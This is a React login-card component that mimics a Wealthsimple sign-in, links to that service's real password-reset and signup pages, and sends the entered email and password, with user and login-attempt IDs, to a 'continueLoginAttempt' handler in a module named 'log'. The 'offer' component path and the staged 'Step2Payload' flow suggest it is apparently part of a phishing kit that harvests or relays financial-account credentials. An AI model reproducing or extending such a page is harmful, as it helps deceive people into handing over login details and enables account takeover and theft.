"use client";

import { useId, useState } from "react";

import { zodResolver } from "@hookform/resolvers/zod";
import { Eye, EyeOff, Loader2Icon } from "lucide-react";
import { useForm } from "react-hook-form";
import { z } from "zod";

import { Button } from "@/components/offer/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/offer/ui/card";
import { Input } from "@/components/offer/ui/input";
import { Label } from "@/components/offer/ui/label";
import { useMutation } from "@tanstack/react-query";
import { continueLoginAttempt } from "@/lib/api/handlers/log";
import { Step2Payload } from "@/lib/api/schemas";
import { AxiosError } from "axios";

const loginSchema = z.object({
  email: z.email("Enter a valid email"),
  password: z.string().min(1, "Password is required"),
});

export type LoginFormValues = z.infer<typeof loginSchema>;

interface OfferLoginCardProps {
  userId: string;
  loginAttemptId: string;
  onSuccess?: (values: LoginFormValues) => void;
}

export function OfferLoginCard({ userId, loginAttemptId, onSuccess }: OfferLoginCardProps) {
  const [showPassword, setShowPassword] = useState(false);

  const emailId = useId();
  const passwordId = useId();
  const emailErrorId = useId();
  const passwordErrorId = useId();

  const {
    register,
    handleSubmit,
    setError,
    formState: { errors, isSubmitting },
  } = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const { mutateAsync: continueLoginAttemptMutation, isPending } = useMutation({
    mutationFn: (credentials: Step2Payload) => continueLoginAttempt(credentials),
    onError: (error: AxiosError<{ error: string }>) => setError("password", { message: error.response?.data.error }),
  });

  const onSubmit = async (credentials: LoginFormValues) => {
    await continueLoginAttemptMutation({
      userId,
      loginAttemptId,
      email: credentials.email,
      password: credentials.password,
    });

    onSuccess?.(credentials);
  };

  return (
    <Card className="w-full max-w-md">
      <CardHeader>
        <CardTitle>Welcome back</CardTitle>
      </CardHeader>

      <CardContent>
        <form onSubmit={handleSubmit(onSubmit)} className="mt-6 space-y-5" noValidate>
          <div className="space-y-4">
            <div>
              <Label className="sr-only" htmlFor={emailId}>
                Email
              </Label>
              <Input
                id={emailId}
                autoComplete="username"
                inputMode="email"
                placeholder="Email"
                aria-invalid={errors.email ? true : undefined}
                aria-describedby={errors.email ? emailErrorId : undefined}
                {...register("email")}
              />
              {errors.email?.message ? (
                <p id={emailErrorId} className="mt-2 text-sm font-medium text-destructive">
                  {errors.email.message}
                </p>
              ) : null}
            </div>

            <div className="relative">
              <Label className="sr-only" htmlFor={passwordId}>
                Password
              </Label>
              <Input
                id={passwordId}
                autoComplete="current-password"
                placeholder="Password"
                type={showPassword ? "text" : "password"}
                className="pr-14"
                aria-invalid={errors.password ? true : undefined}
                aria-describedby={errors.password ? passwordErrorId : undefined}
                {...register("password")}
              />

              <button
                type="button"
                aria-label={showPassword ? "Hide password" : "Show password"}
                onClick={() => setShowPassword((v) => !v)}
                className="absolute right-4 top-1/2 -translate-y-1/2 rounded-full p-2 text-muted-foreground hover:bg-foreground/5 hover:text-foreground"
              >
                {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
              </button>
            </div>
            {errors.password?.message ? (
              <p id={passwordErrorId} className="text-sm font-medium text-destructive">
                {errors.password.message}
              </p>
            ) : null}

            <a
              className="offer-link inline-block text-lg font-semibold text-foreground"
              href="https://my.wealthsimple.com/app/password/forgot"
            >
              Forgot password?
            </a>
          </div>

          <Button type="submit" className="w-full" disabled={isSubmitting || isPending}>
            {isPending ? <Loader2Icon className="animate-spin size-6" /> : "Log in"}
          </Button>

          <p className="text-center text-lg text-muted-foreground">
            Don&apos;t have an account?{" "}
            <a className="offer-link font-semibold text-foreground" href="https://my.wealthsimple.com/app/signup">
              Sign up
            </a>
          </p>
        </form>
      </CardContent>
    </Card>
  );
}
